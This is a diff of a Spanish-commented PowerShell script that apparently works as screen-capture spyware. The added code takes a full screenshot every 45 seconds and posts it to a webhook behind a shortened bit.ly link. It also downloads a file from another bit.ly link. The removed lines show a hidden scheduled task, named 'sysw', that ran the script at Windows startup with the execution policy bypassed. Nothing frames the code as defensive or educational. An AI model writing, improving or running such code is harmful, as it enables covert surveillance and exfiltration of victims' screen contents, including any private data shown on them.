@@ -1,7 +1,6 @@
-# Descargar automáticamente el archivo desde el enlace
-$url = "https://bit.ly/Screen_dc"
-$output = "$env:temp\SC.png"
-Invoke-WebRequest -Uri $url -OutFile $output
+# Definir el Webhook URL y el intervalo de tiempo
+$hookurl = "https://bit.ly/web_chupakbras"
+$seconds = 45 # Intervalo de captura de pantalla en segundos
 
 # Función para enviar la imagen al webhook
 function Send-Screenshot {
@@ -23,17 +22,27 @@ function Send-Screenshot {
     Invoke-RestMethod -Uri $WebhookURL -Method Post -ContentType $contentType -Body $body
 }
 
-# Webhook URL
-$webhookURL = "https://bit.ly/web_chupakbras"
+# Descargar la imagen desde el enlace
+$Filett = "$env:temp\SC.png"
+Invoke-WebRequest -Uri "https://bit.ly/Screen_dc" -OutFile $Filett
 
-# Crear la tarea programada para ejecutar el script al iniciar Windows
-$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$output`""
-$trigger = New-ScheduledTaskTrigger -AtStartup
-$settings = New-ScheduledTaskSettingsSet -Hidden -DisallowStartIfOnBatteries -DontStopIfGoingOnBatteries
-Register-ScheduledTask -TaskName "sysw" -Action $action -Trigger $trigger -Settings $settings
-
-# Loop para enviar imágenes cada 45 segundos
+# Loop para enviar imágenes al webhook cada 45 segundos
 while ($true) {
-    Send-Screenshot -ImageFile $output -WebhookURL $webhookURL
-    Start-Sleep -Seconds 45
+    Add-Type -AssemblyName System.Windows.Forms
+    Add-type -AssemblyName System.Drawing
+    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+    $Width = $Screen.Width
+    $Height = $Screen.Height
+    $Left = $Screen.Left
+    $Top = $Screen.Top
+    $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
+    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
+    $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
+    $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
+
+    # Enviar la imagen al webhook
+    Send-Screenshot -ImageFile $Filett -WebhookURL $hookurl
+
+    # Esperar el intervalo de tiempo especificado
+    Start-Sleep -Seconds $seconds
 }
